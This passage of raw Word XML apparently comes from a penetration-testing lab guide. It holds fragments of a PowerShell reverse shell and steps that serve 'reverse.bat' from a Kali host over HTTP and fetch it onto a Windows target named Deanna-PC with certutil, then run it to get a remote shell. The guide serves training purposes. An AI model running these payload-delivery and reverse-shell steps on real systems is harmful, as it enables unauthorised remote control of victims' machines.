          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$enc.GetString($bytes,0,$count=$stream.Read($bytes,0,$bytes.Length));if($instr1.Contains('PAM')){$prompt='| Panic Watching Service</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$instr1 -replace '.*&gt; ',''};$outstr = 'WhoAmI: ' + $(whoami) + $nl + 'IP: ' + (Get-Location).Path + '&gt;';if($instr1 -ne 'exit'){$sendback =</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$sendbyte.Length);$stream.Flush()}"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="2"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Ch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nge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&lt;k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li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_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&gt; to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K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li’s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IP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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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v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 the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ile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/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me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/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k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li/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v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erse.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,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n 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mo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se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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="5393" w:hanging="360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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Create a </w:t>
      </w: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Py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thon H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w: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T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 xml:space="preserve">P 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 xml:space="preserve">erver to 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erve rev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r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e.ba</w:t>
      </w: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t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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="53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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>In a Kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525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252525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252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ara</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e ter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inal, e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ter:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">python3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m http.server 80</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="50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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>erify</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali is</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Serving HTTP on 0.0.0.0 port 80</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Do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>w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nload rever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e.bat</w:t>
      </w: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onto Dean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>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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-PC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="20"/>
        <w:ind w:left="1800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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="53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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Edit the follo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ith Kali’s IP:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">certutil </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">urlcache </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">split </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f http://&lt;kali_IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/reverse.bat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Window</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\Tem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>reverse.bat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="3145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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="50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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ode, then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">aste it into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hell on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ean</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">-PC and run it. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="7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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
